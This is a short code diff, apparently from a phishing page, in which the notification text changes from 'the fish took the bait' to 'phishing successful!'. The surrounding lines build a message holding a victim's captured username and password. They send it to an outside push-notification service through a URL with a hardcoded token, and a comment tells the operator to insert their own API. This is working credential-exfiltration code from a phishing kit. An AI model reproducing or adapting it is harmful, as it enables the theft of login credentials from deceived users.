@@ -32,7 +32,7 @@
             //    text: "鱼上钩了",//text 固定必填且字段为 text
             //    desp: `账号：${userName}，密码：${passWord}`
             //}
-            let data = "鱼上钩了"+`账号：${userName}，密码：${passWord}`
+            let data = "钓鱼成功！"+`账号：${userName}，密码：${passWord}`
 
             // 这里修改成自己的api
             let url = 'https://www.pushplus.plus/send?token=833bb521ea654abab17470a390e6f761&content=' + data
